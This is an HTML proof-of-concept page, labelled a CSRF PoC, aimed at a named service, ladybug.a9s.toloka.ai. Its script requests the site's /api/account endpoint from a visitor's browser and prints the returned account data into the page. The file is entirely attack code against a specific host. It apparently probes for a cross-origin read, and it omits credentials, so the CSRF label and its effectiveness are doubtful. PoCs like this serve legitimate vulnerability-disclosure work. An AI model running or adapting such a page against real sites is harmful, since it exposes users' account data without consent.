<!-- csrf-poc.html -->
<!DOCTYPE html>
<html>
<head>
  <title>CSRF Proof of Concept</title>
</head>
<body>
  <h1>CSRF PoC - Toloka Ladybug</h1>
  <script>
    fetch("https://ladybug.a9s.toloka.ai/api/account")
      .then(response => response.json())
      .then(data => {
        document.body.innerHTML += "<pre>" + JSON.stringify(data, null, 2) + "</pre>";
      })
      .catch(err => {
        document.body.innerHTML += "<pre>Request failed: " + err + "</pre>";
      });
  </script>
</body>
</html>
